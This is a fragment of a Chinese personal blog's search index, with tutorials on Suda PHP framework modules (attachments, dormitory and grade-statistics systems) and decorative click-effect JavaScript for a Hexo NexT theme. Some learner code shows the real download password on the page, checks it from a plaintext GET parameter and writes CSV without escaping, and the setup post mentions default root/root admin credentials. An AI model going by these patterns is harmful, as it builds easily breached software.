&#125; &#125; return false; &#125;&#125; providerAttachmentProvider.php123456789101112131415161718192021222324252627282930313233&lt;?phpnamespace dxkite\attachments\provider;use dxkite\attachments\controller\AttachmentController;use dxkite\support\file\File;/** * 附件 */class AttachmentProvider&#123; protected $controller; public function __construct(string $name = null) &#123; $this-&gt;controller = new AttachmentController($name); &#125; public function add(int $target, File $attachment):bool &#123; return $this-&gt;controller-&gt;add($target, $attachment); &#125; public function getAttachments(int $target):?array &#123; return $this-&gt;controller-&gt;getAttachments($target); &#125; public function delete(int $attachmentId):bool &#123; return $this-&gt;controller-&gt;delete($attachmentId); &#125;&#125; config (confession.wall)api12345v1.0: confession-wall: dxkite.confession.wall.provider.ConfessionProvider confession-wall-comment: dxkite.comments.provider.CommentProvider(confession-wall) confession-wall-attachment: dxkite.attachments.provider.AttachmentProvider(dxkite.confession.wall.table.ConfessionTable) confession-wall-setting: dxkite.confession.wall.provider.ConfessionSettingProvider 具体操作就… https://dxkite.cn/2018/08/28/suda-attachments/ 大概就是这样 基本的功能已经实现]]></content>
      <categories>
        <category>Suda框架学习</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Suda</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次suda框架之宿舍管理系统]]></title>
    <url>%2F2018%2F08%2F12%2FSuda-apartment-management-system%2F</url>
    <content type="text"><![CDATA[宿舍管理系统两个网站及其所需模块 用户中心网站 support, user-center-server 选宿舍网站 support,user-center-client,apartment 准备两个文件夹 里面有suda、public 使用phpstudy 配置两个站点 网站目都是public 进入网站刷新一下 两个文件夹都出现app文件夹 这里可以考虑将data文件删了….反正是数据文件，会自动更新，app/modules/..的app文件也可删了，因为用不上了 启动模块用户中心的模块 support, user-center-server 宿舍系统的模块 support,user-center-client,apartment 数据库分类为什么分类呢 方便管理修改用户中心的数据库 库名看自己 修改宿舍系统的数据库 库名看自己 进入用户中心http://用户中心的网址/dev.php/setting 关于输入密码问题 mod修改后 首次进入自动登入 这里可以略了 输入密码管理员账号为-u root -p root-u dxkite -p dxkite两个都可以 添加网站的一系列操作 把宿舍选择的那个网站添加进来 这个东西呢 在宿舍系统中可以看到 (最新mod)12http://选宿舍的网址/dev.php/oauth-client/callbackhttp://选宿舍的网址/dev.php/api/oauth/user-client 进入宿舍系统http://选宿舍的网址/dev.php/setting 在最新mod中 这里会显示 回调地址 和API接口 修改信息，内容来自之前用户中心网站信息 注意点击修改 以上为这个的基本配置 导入数据 测试啊 什么什么的就没我的事了 有关于模块之类的东西 可以去群里也可以直接去会长大大的GitHub吧…会长的GitHub应该放了吧…啊哈哈哈我不清楚https://github.com/DXkite]]></content>
      <categories>
        <category>Suda框架学习</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Suda</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次suda框架之简单成绩系统]]></title>
    <url>%2F2018%2F08%2F10%2FSuda-performance-statistics-system%2F</url>
    <content type="text"><![CDATA[创建一个项目作为一个萌新 对创建一个新项目后 对项目的结构可能会有所陌生 不知道该有什么 所以这里可以复制之前的项目 简单的说就是复制一个app文件夹 然后改名为statistical 关于里面的内容 ./resoure 目录下 ./config/router.json # 路由文件内容当然要清理./template/defalut/ # 因为你需要新写入模板 所以该目录下的模板建议删了 ./share 目录下 ./table/ #库文件 因为你可能不适用这些 所以删了 ./src 目录下 ./ #响应文件 差不多是与模板对应的 所以删了 ./module.json #模板的配置文件 所以内筒清理 关于data文件 data是自动生成的 所以 为了防止之前执行的东东 影响本次 所以 删了 目录结构 ps.为啥这里我不适用那个高逼格的制表符 是因为没用过 不会用… 大佬语录 template 下的是模板文件src的文件是页面响应文件share的文件是库文件 设置配置文件模板配置 module.json12345678910111213141516171819&#123; "name": "dxkite/statistical", "namespace": "dxkite/statistical", "authors": [&#123; "name": "dxkite", "email": "dxkite@qq.com" &#125;], "import": &#123; "share": &#123; "dxkite\\statistical": "share" &#125;, "src": &#123; "dxkite\\statistical\\response": "src" &#125; &#125;, "discription": "DXkite的成绩统计模块", "require": &#123;&#125;, "version": "1.0.0"&#125; 启用模块 manifast.json1234567891011121314&#123; "name": "dxkite-statistical-app", "namespace": "dxkite\\statistical", "version": "1.0-dev", "application": "suda\\core\\Application", "modules": ["suda", "statistical"], "reachable": ["statistical"], "language": "zh-CN", "url": &#123; "mode": 0, "beautify": true, "rewrite": true &#125;&#125; 表单配置 statistic.json12345678910111213141516171819202122232425262728&#123; "table_id_1": &#123; "name": "学生XXX统计表", "fields": &#123; "math": &#123; "name": "数学成绩", "type": "number" &#125;, "english": &#123; "name": "英语成绩", "type": "number" &#125; &#125; &#125;, "table_id_2": &#123; "name": "学生XXX统计表-2", "fields": &#123; "math": &#123; "name": "数学成绩", "type": "number" &#125;, "english": &#123; "name": "英语成绩", "type": "number" &#125; &#125; &#125;&#125; 路由配置 router.json1234567891011121314&#123; "index": &#123; "url": "\/", "class": "dxkite\\statistical\\response\\IndexResponse" &#125;, "table": &#123; "url": "\/&#123;table_id:string&#125;", "class": "dxkite\\statistical\\response\\TableResponse" &#125;, "download": &#123; "url": "\/&#123;table_id:string&#125;\/download", "class": "dxkite\\statistical\\response\\DownloadResponse" &#125;&#125; 案例分析请移步 会长文章 模板及响应文件StatisticTable.php这是放在 ./share/table 目录下的 相当于库文件吧 12345678910111213141516171819202122232425262728&lt;?phpnamespace dxkite\statistical\table;class StatisticTable extends \suda\archive\Table &#123; public function __construct()&#123; // 数据表名 parent::__construct('statistic'); &#125; protected function onBuildCreator($table)&#123; $table-&gt;fields( $table-&gt;field('id','bigint',20)-&gt;primary()-&gt;auto()-&gt;comment('自动增长ID'), $table-&gt;field('student_id','varchar',80)-&gt;key()-&gt;comment('学号'), $table-&gt;field('table_id','varchar',80)-&gt;key()-&gt;comment('姓名'), $table-&gt;field('name','varchar',80), $table-&gt;field('data','text') ); return $table; &#125; protected function _inputDataField($data)&#123; return serialize($data); &#125; protected function _outputDataField($data)&#123; return unserialize($data); &#125;&#125; index.tpl.html你可能需要一个index 这个界面可以自己制作一个&lt;table&gt;需要注意的地方就是 url的生成方式 也可以参考我的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Index - 备选表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt; ID &lt;/th&gt; &lt;th&gt; 名称 &lt;/th&gt; &lt;th&gt; 操作 &lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt; table_id_1 &lt;/td&gt; &lt;td&gt; 学生XXX统计表 &lt;/td&gt; &lt;td&gt; &lt;a href="@u('table', 'table_id_1' )"&gt;填写&lt;/a&gt; &lt;a href="@u('download','table_id_1')"&gt;下载&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt; table_id_2 &lt;/td&gt; &lt;td&gt; 学生XXX统计表-2 &lt;/td&gt; &lt;td&gt; &lt;a href="@u('table', 'table_id_2' )"&gt;填写&lt;/a&gt; &lt;a href="@u('download','table_id_2')"&gt;下载&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; TableResponse.php &amp;&amp; table.tpl.html下面的这个代码 的作用是 你在url里输入什么 他就会返回什么 纯属好玩 给你玩玩的 应该放在 index之前的 因为index弄好后会有连接 难免会手痒点两下 TableResponse.php123456789101112&lt;?phpnamespace dxkite\statistical\response;use suda\core\Request;class TableResponse extends \suda\core\Response&#123; public function onRequest(Request $request) &#123; echo $request-&gt;get('table_id'); &#125;&#125; table.tpl.htmltable的模板设计1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;&#123;&#123;$:name&#125;&#125; - 填写表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;&#123;&#123;$:name&#125;&#125;&lt;/h3&gt; &lt;form action="@u" method="post"&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;td&gt; &lt;input type="text" name="name" /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;学号&lt;/th&gt; &lt;td&gt; &lt;input type="text" name="number" /&gt; &lt;/td&gt; &lt;/tr&gt; @foreach ($:fields as $id =&gt; $field) &lt;tr&gt; &lt;th&gt;&#123;&#123;$field['name']&#125;&#125;&lt;/th&gt; &lt;td&gt; @if ($field['type'] == 'text') &lt;textarea name="data[&#123;&#123;$id&#125;&#125;]" cols="30" rows="10" required&gt;&lt;/textarea&gt; @elseif ($field['type'] == 'number') &lt;input type="number" name="data[&#123;&#123;$id&#125;&#125;]" required&gt; @else &lt;input type="text" name="data[&#123;&#123;$id&#125;&#125;]" required&gt; @endif &lt;/td&gt; @endforeach &lt;/tr&gt; &lt;/table&gt; &lt;button&gt;提交&lt;/button&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; TableResponse.php完善过后一次的响应文件123456789101112131415161718192021222324&lt;?phpnamespace dxkite\statistical\response;use suda\core\Request;class TableResponse extends \suda\core\Response&#123; public function onRequest(Request $request) &#123; $tables = app()-&gt;getModuleConfig(app()-&gt;getFileModule(__FILE__), 'statistic'); $tableId = $request-&gt;get('table_id'); // 判断是否存在ID if (isset($tables[$tableId])) &#123; $view = $this-&gt;page('table'); $view-&gt;set('fields',$tables[$tableId]['fields']); $view-&gt;set('name',$tables[$tableId]['name']); $view-&gt;render(); &#125; else &#123; // 显示404界面 hook()-&gt;exec('system:404'); &#125; &#125;&#125; TableResponse.php再次升级 新增写入数据你可能需要一个state.tpl.html后面有 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpnamespace dxkite\statistical\response;use suda\core\Request;class TableResponse extends \suda\core\Response&#123; public function onRequest(Request $request) &#123; $tables = app()-&gt;getModuleConfig(app()-&gt;getFileModule(__FILE__), 'statistic'); $tableId = $request-&gt;get('table_id'); // 判断是否存在ID if (isset($tables[$tableId])) &#123; if ($request-&gt;hasPost()) &#123; // 显示结果页面 $view = $this-&gt;page('state'); if ($type = $this-&gt;insertData($tableId, $request)) &#123; if ($type == 1) &#123; $view-&gt;set('message','写入成功'); &#125; else &#123; $view-&gt;set('message','数据未更新'); &#125; &#125; else &#123; $view-&gt;set('message','写入失败'); &#125; $view-&gt;render(); &#125; else &#123; $view = $this-&gt;page('table'); $view-&gt;set('fields', $tables[$tableId]['fields']); $view-&gt;set('name', $tables[$tableId]['name']); $view-&gt;render(); &#125; &#125; else &#123; // 显示404界面 hook()-&gt;exec('system:404'); &#125; &#125; public function insertData(string $tableId, Request $request): int &#123; $table = new \dxkite\statistical\table\StatisticTable; if ($request-&gt;post('name', null) &amp;&amp; $request-&gt;post('number', null) &amp;&amp; $request-&gt;post('data', null)) &#123; // 查询条件 $where = [ 'table_id' =&gt; $tableId, 'student_id' =&gt; $request-&gt;post('number') ]; // 如果存在学号相同，则更新记录 // 根据ID更新会更快 if ($data = $table-&gt;select(['id'],$where)-&gt;fetch()) &#123; if ($table-&gt;updateByPrimaryKey($data['id'], [ 'name' =&gt; $request-&gt;post('name'), 'data' =&gt; $request-&gt;post('data') ])) &#123; // 更新成功 return 1; &#125; else &#123; // 未跟新 return 2; &#125; &#125; else &#123; // 插入新记录 $id = $table-&gt;insert([ 'table_id' =&gt; $tableId, 'student_id' =&gt; $request-&gt;post('number'), 'name' =&gt; $request-&gt;post('name'), 'data' =&gt; $request-&gt;post('data'), ]); if ($id &gt; 0) &#123; return 1; &#125; &#125; &#125; return 0; &#125;&#125; DownloadResponse.php下载有两个版本 非密码版本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpnamespace dxkite\statistical\response;use suda\core\Request;class DownloadResponse extends \suda\core\Response&#123; public function onRequest(Request $request) &#123; $tables = app()-&gt;getModuleConfig(app()-&gt;getFileModule(__FILE__), 'statistic'); $tableId = $request-&gt;get('table_id'); // 判断是否存在ID if (isset($tables[$tableId])) &#123; $data = $this-&gt;exportData($tableId, $tables[$tableId]['fields']); // 暂存文件 $path = RUNTIME_DIR .'/'. $tableId .'.csv'; storage()-&gt;put($path,$data); // 生成文件下载 $this-&gt;file($path); &#125; else &#123; // 显示404界面 hook()-&gt;exec('system:404'); &#125; &#125; public function exportData(string $tableId, array $fields): string &#123; $table = new \dxkite\statistical\table\StatisticTable; // 列出同一个表格 $datas = $table-&gt;listWhere(['table_id' =&gt; $tableId]); // 生成表头 $csv = []; $csv[0] = [ 0 =&gt;'学号', 1 =&gt; '姓名']; // 表头ID $header = [0,1]; foreach ($fields as $id =&gt; $value) &#123; $csv[0][$id] = $value['name']; $header[] = $id; &#125; // 生成数据 foreach ($datas as $data) &#123; $id = count($csv); $csv[$id][0]= $data['student_id']; $csv[$id][1]= $data['name']; foreach ($data['data'] as $index =&gt; $value) &#123; $csv[$id][$index]=$value; &#125; &#125; $text = ''; foreach ($csv as $data) &#123; $row = []; foreach ($header as $id) &#123; $row[] = $data[$id]; &#125; $text .= implode(',', $row) . "\r\n"; &#125; return $text; &#125;&#125; 密码验证版本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?phpnamespace dxkite\statistical\response;use suda\core\Request;class DownloadResponse extends \suda\core\Response&#123; public function onRequest(Request $request) &#123; $tables = app()-&gt;getModuleConfig(app()-&gt;getFileModule(__FILE__), 'statistic'); $tableId = $request-&gt;get('table_id'); // 判断是否存在ID if (isset($tables[$tableId])) &#123; if (isset($tables[$tableId]['password'])) &#123; if ($request-&gt;get('password') == $tables[$tableId]['password']) &#123; $this-&gt;download($tableId, $tables[$tableId]['fields']); &#125; else &#123; echo '密码错误'; &#125; &#125; else &#123; $this-&gt;download($tableId, $tables[$tableId]['fields']); &#125; &#125; else &#123; // 显示404界面 hook()-&gt;exec('system:404'); &#125; &#125; public function download(string $tableId, array $fields) &#123; $data = $this-&gt;exportData($tableId, $fields); // 暂存文件 $path = RUNTIME_DIR .'/'. $tableId .'.csv'; storage()-&gt;put($path, $data); // 生成文件下载 $this-&gt;file($path); &#125; public function exportData(string $tableId, array $fields): string &#123; $table = new \dxkite\statistical\table\StatisticTable; // 列出同一个表格 $datas = $table-&gt;listWhere(['table_id' =&gt; $tableId]); // 生成表头 $csv = []; $csv[0] = [ 0 =&gt;'学号', 1 =&gt; '姓名']; // 表头ID $header = [0,1]; foreach ($fields as $id =&gt; $value) &#123; $csv[0][$id] = $value['name']; $header[] = $id; &#125; // 生成数据 foreach ($datas as $data) &#123; $id = count($csv); $csv[$id][0]= $data['student_id']; $csv[$id][1]= $data['name']; foreach ($data['data'] as $index =&gt; $value) &#123; $csv[$id][$index]=$value; &#125; &#125; $text = ''; foreach ($csv as $data) &#123; $row = []; foreach ($header as $id) &#123; $row[] = $data[$id]; &#125; $text .= implode(',', $row) . "\r\n"; &#125; return $text; &#125;&#125; 使用密码验证时需要设置密码 你所需要的下载姿势是./dev.php/table_id_1/download?password=密码 state.tpl.html该页面是为了显示 数据写入信息的123456789101112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Action PAGE&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;P&gt;&#123;&#123; $:message &#125;&#125;&lt;/P&gt;&lt;/body&gt;&lt;/html&gt; 个人姿势为了方便在url传值 我对download.tpl.html、DownloadResponse.php进行了修改新增了： 输入框输入 密码提示 当前输入密码 download.tpl.html1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Action PAGE&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action="@u" method="GET"&gt; Password:&lt;input type="password" name="password"&gt; &lt;input type="submit" value="Submit"&gt; &lt;/form&gt; &lt;div&gt; &lt;div&gt;下载密码: &#123;&#123; $:pwd &#125;&#125; &lt;/div&gt; &lt;div&gt;你的输入的密码: &#123;&#123; $:ypwd &#125;&#125;&lt;/div&gt; &lt;div&gt;当前情况: &#123;&#123; $:response &#125;&#125; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; DownloadResponse.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phpnamespace mobenw\statistical\response;use suda\core\Request;class DownloadResponse extends \suda\core\Response&#123; public function onRequest(Request $request) &#123; $tables = app()-&gt;getModuleConfig(app()-&gt;getFileModule(__FILE__), 'statistic'); $tableId = $request-&gt;get('table_id'); // 判断是否存在ID if (isset($tables[$tableId])) &#123; if (isset($tables[$tableId]['password'])) &#123; // 显示密码填写界面 $view = $this-&gt;page('download'); //设置页面变量 $view-&gt;set('pwd',$tables[$tableId]['password']); $view-&gt;set('ypwd',$request-&gt;get('password')); if ($request-&gt;get('password') == $tables[$tableId]['password']) &#123; $view-&gt;set('response','密码正确，请下载'); $this-&gt;download($tableId, $tables[$tableId]['fields']); &#125; else &#123; $view-&gt;set('response','密码错误'); &#125; // 渲染模板显示出来 $view-&gt;render(); &#125; else &#123; $this-&gt;download($tableId, $tables[$tableId]['fields']); &#125; &#125; else &#123; // 显示404界面 hook()-&gt;exec('system:404'); &#125; &#125; public function download(string $tableId, array $fields) &#123; $data = $this-&gt;exportData($tableId, $fields); // 暂存文件 $path = RUNTIME_DIR .'/'. $tableId .'.csv'; storage()-&gt;put($path, $data); // 生成文件下载 $this-&gt;file($path); &#125; public function exportData(string $tableId, array $fields): string &#123; $table = new \mobenw\statistical\table\StatisticTable; // 列出同一个表格 $datas = $table-&gt;listWhere(['table_id' =&gt; $tableId]); // 生成表头 $csv = []; $csv[0] = [ 0 =&gt;'学号', 1 =&gt; '姓名']; // 表头ID $header = [0,1]; foreach ($fields as $id =&gt; $value) &#123; $csv[0][$id] = $value['name']; $header[] = $id; &#125; // 生成数据 foreach ($datas as $data) &#123; $id = count($csv); $csv[$id][0]= $data['student_id']; $csv[$id][1]= $data['name']; foreach ($data['data'] as $index =&gt; $value) &#123; $csv[$id][$index]=$value; &#125; &#125; $text = ''; foreach ($csv as $data) &#123; $row = []; foreach ($header as $id) &#123; $row[] = $data[$id]; &#125; $text .= implode(',', $row) . "\r\n"; &#125; return $text; &#125;&#125; 后记基本教程应该就是这样了 不对 是心酸历程就是这样了这里附上会长大佬的链接https://dxkite.cn/2018/08/05/suda-results-statistical-design/https://dxkite.cn/2018/08/06/suda-results-statistical-router/https://dxkite.cn/2018/08/07/suda-results-statistical-data/]]></content>
      <categories>
        <category>Suda框架学习</category>
      </categories>
      <tags>
        <tag>Suda</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[或许你的手机上需要一个linux]]></title>
    <url>%2F2018%2F08%2F09%2FMaybe-your-mobile-phone-might-need-a-Linux%2F</url>
    <content type="text"><![CDATA[Termux 高级终端安装使用配置教程请看大佬文章！写的很好！我需要做的就是看和推广http://www.sqlsec.com/2018/05/termux.html#more]]></content>
      <categories>
        <category>安装新东西</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>小配件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你的clicklove小爱心正在路上]]></title>
    <url>%2F2018%2F08%2F07%2FBlog-your-clicklove-is-on-the-way%2F</url>
    <content type="text"><![CDATA[非原创，文章出处：https://asdfv1929.github.io/2018/01/26/click-love/ 毕竟还是萌新 需要借鉴各路大佬的知识 小❤❤创建一个js文件在\themes\next\source\js\src下新建文件clicklove.js代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445! function (e, t, a) &#123; function n() &#123; c(".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"), o(), r() &#125; function r() &#123; for (var e = 0; e &lt; d.length; e++) d[e].alpha &lt;= 0 ? (t.body.removeChild(d[e].el), d.splice(e, 1)) : (d[e].y--, d[e].scale += .004, d[e].alpha -= .013, d[e].el.style.cssText = "left:" + d[e].x + "px;top:" + d[e].y + "px;opacity:" + d[e].alpha + ";transform:scale(" + d[e].scale + "," + d[e].scale + ") rotate(45deg);background:" + d[e].color + ";z-index:99999"); requestAnimationFrame(r) &#125; function o() &#123; var t = "function" == typeof e.onclick &amp;&amp; e.onclick; e.onclick = function (e) &#123; t &amp;&amp; t(), i(e) &#125; &#125; function i(e) &#123; var a = t.createElement("div"); a.className = "heart", d.push(&#123; el: a, x: e.clientX - 5, y: e.clientY - 5, scale: 1, alpha: 1, color: s() &#125;), t.body.appendChild(a) &#125; function c(e) &#123; var a = t.createElement("style"); a.type = "text/css"; try &#123; a.appendChild(t.createTextNode(e)) &#125; catch (t) &#123; a.styleSheet.cssText = e &#125; t.getElementsByTagName("head")[0].appendChild(a) &#125; function s() &#123; return "rgb(" + ~~ (255 * Math.random()) + "," + ~~ (255 * Math.random()) + "," + ~~ (255 * Math.random()) + ")" &#125; var d = []; e.requestAnimationFrame = function () &#123; return e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) &#123; setTimeout(e, 1e3 / 60) &#125; &#125;(), n()&#125;(window, document); 修改_layout.swig在\themes\next\layout\_layout.swig文件末尾添加以下代码(纳闷了 为啥放哪都行 神奇的script 不过建议放后面 不然有bug)12&lt;!-- 页面点击小红心 --&gt;&lt;script type="text/javascript" src="/js/src/clicklove.js"&gt;&lt;/script&gt; 爆炸效果创建一个js文件同上fireworks.jsuse strict";function updateCoords(e) &#123; pointerX = (e.clientX || e.touches[0].clientX) - canvasEl.getBoundingClientRect().left, pointerY = e.clientY || e.touches[0].clientY - canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e) &#123; var t = anime.random(0, 360) * Math.PI / 180, a = anime.random(50, 180), n = [ - 1, 1][anime.random(0, 1)] * a; return &#123; x: e.x + n * Math.cos(t), y: e.y + n * Math.sin(t) &#125;&#125;function createParticule(e, t) &#123; var a = &#123;&#125;; return a.x = e, a.y = t, a.color = colors[anime.random(0, colors.length - 1)], a.radius = anime.random(16, 32), a.endPos = setParticuleDirection(a), a.draw = function() &#123; ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.fillStyle = a.color, ctx.fill() &#125;, a&#125;function createCircle(e, t) &#123; var a = &#123;&#125;; return a.x = e, a.y = t, a.color = "#F00", a.radius = 0.1, a.alpha = 0.5, a.lineWidth = 6, a.draw = function() &#123; ctx.globalAlpha = a.alpha, ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.lineWidth = a.lineWidth, ctx.strokeStyle = a.color, ctx.stroke(), ctx.globalAlpha = 1 &#125;, a&#125;function renderParticule(e) &#123; for (var t = 0; t &lt; e.animatables.length; t++) &#123; e.animatables[t].target.draw() &#125;&#125;function animateParticules(e, t) &#123; for (var a = createCircle(e, t), n = [], i = 0; i &lt; numberOfParticules; i++) &#123; n.push(createParticule(e, t)) &#125; anime.timeline().add(&#123; targets: n, x: function(e) &#123; return e.endPos.x &#125;, y: function(e) &#123; return e.endPos.y &#125;, radius: 0.1, duration: anime.random(1200, 1800), easing: "easeOutExpo", update: renderParticule &#125;).add(&#123; targets: a, radius: anime.random(80, 160), lineWidth: 0, alpha: &#123; value: 0, easing: "linear", duration: anime.random(600, 800) &#125;, duration: anime.random(1200, 1800), easing: "easeOutExpo", update: renderParticule, offset: 0 &#125;)&#125;function debounce(e, t) &#123; var a; return function() &#123; var n = this, i = arguments; clearTimeout(a), a = setTimeout(function() &#123; e.apply(n, i) &#125;, t) &#125;&#125;var canvasEl = document.querySelector(".fireworks");if (canvasEl) &#123; var ctx = canvasEl.getContext("2d"), numberOfParticules = 30, pointerX = 0, pointerY = 0, tap = "mousedown", colors = ["#FF1461", "#18FF92", "#5A87FF", "#FBF38C"], setCanvasSize = debounce(function() &#123; canvasEl.width = 2 * window.innerWidth, canvasEl.height = 2 * window.innerHeight, canvasEl.style.width = window.innerWidth + "px", canvasEl.style.height = window.innerHeight + "px", canvasEl.getContext("2d").scale(2, 2) &#125;, 500), render = anime(&#123; duration: 1 / 0, update: function() &#123; ctx.clearRect(0, 0, canvasEl.width, canvasEl.height) &#125; &#125;); document.addEventListener(tap, function(e) &#123; "sidebar" !== e.target.id &amp;&amp; "toggle-sidebar" !== e.target.id &amp;&amp; "A" !== e.target.nodeName &amp;&amp; "IMG" !== e.target.nodeName &amp;&amp; (render.play(), updateCoords(e), animateParticules(pointerX, pointerY)) &#125;, !1), setCanvasSize(), window.addEventListener("resize", setCanvasSize, !1)&#125;"use strict";function updateCoords(e) &#123; pointerX = (e.clientX || e.touches[0].clientX) - canvasEl.getBoundingClientRect().left, pointerY = e.clientY || e.touches[0].clientY - canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e) &#123; var t = anime.random(0, 360) * Math.PI / 180, a = anime.random(50, 180), n = [ - 1, 1][anime.random(0, 1)] * a; return &#123; x: e.x + n * Math.cos(t), y: e.y + n * Math.sin(t) &#125;&#125;function createParticule(e, t) &#123; var a = &#123;&#125;; return a.x = e, a.y = t, a.color = colors[anime.random(0, colors.length - 1)], a.radius = anime.random(16, 32), a.endPos = setParticuleDirection(a), a.draw = function() &#123; ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.fillStyle = a.color, ctx.fill() &#125;, a&#125;function createCircle(e, t) &#123; var a = &#123;&#125;; return a.x = e, a.y = t, a.color = "#F00", a.radius = 0.1, a.alpha = 0.5, a.lineWidth = 6, a.draw = function() &#123; ctx.globalAlpha = a.alpha, ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.lineWidth = a.lineWidth, ctx.strokeStyle = a.color, ctx.stroke(), ctx.globalAlpha = 1 &#125;, a&#125;function renderParticule(e) &#123; for (var t = 0; t &lt; e.animatables.length; t++) &#123; e.animatables[t].target.draw() &#125;&#125;function animateParticules(e, t) &#123; for (var a = createCircle(e, t), n = [], i = 0; i &lt; numberOfParticules; i++) &#123; n.push(createParticule(e, t)) &#125; anime.timeline().add(&#123; targets: n, x: function(e) &#123; return e.endPos.x &#125;, y: function(e) &#123; return e.endPos.y &#125;, radius: 0.1, duration: anime.random(1200, 1800), easing: "easeOutExpo", update: renderParticule &#125;).add(&#123; targets: a, radius: anime.random(80, 160), lineWidth: 0, alpha: &#123; value: 0, easing: "linear", duration: anime.random(600, 800) &#125;, duration: anime.random(1200, 1800), easing: "easeOutExpo", update: renderParticule, offset: 0 &#125;)&#125;function debounce(e, t) &#123; var a; return function() &#123; var n = this, i = arguments; clearTimeout(a), a = setTimeout(function() &#123; e.apply(n, i) &#125;, t) &#125;&#125;var canvasEl = document.querySelector(".fireworks");if (canvasEl) &#123; var ctx = canvasEl.getContext("2d"), numberOfParticules = 30, pointerX = 0, pointerY = 0, tap = "mousedown", colors = ["#FF1461", "#18FF92", "#5A87FF", "#FBF38C"], setCanvasSize = debounce(function() &#123; canvasEl.width = 2 * window.innerWidth, canvasEl.height = 2 * window.innerHeight, canvasEl.style.width = window.innerWidth + "px", canvasEl.style.height = window.innerHeight + "px", canvasEl.getContext("2d").scale(2, 2) &#125;, 500), render = anime(&#123; duration: 1 / 0, update: function() &#123; ctx.clearRect(0, 0, canvasEl.width, canvasEl.height) &#125; &#125;); document.addEventListener(tap, function(e) &#123; "sidebar" !== e.target.id &amp;&amp; "toggle-sidebar" !== e.target.id &amp;&amp; "A" !== e.target.nodeName &amp;&amp; "IMG" !== e.target.nodeName &amp;&amp; (render.play(), updateCoords(e), animateParticules(pointerX, pointerY)) &#125;, !1), setCanvasSize(), window.addEventListener("resize", setCanvasSize, !1)&#125;; 修改_layout.swig同上12345&#123;% if theme.fireworks %&#125; &lt;canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" &gt;&lt;/canvas&gt; &lt;script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="/js/src/fireworks.js"&gt;&lt;/script&gt;&#123;% endif %&#125; 主题配置路径\themes\next\_config.yml12# Fireworksfireworks: true]]></content>
      <categories>
        <category>Hexo博客搭建</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>Hexo</tag>
        <tag>NexT</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用GitHub和Hexo搭建自己的博客]]></title>
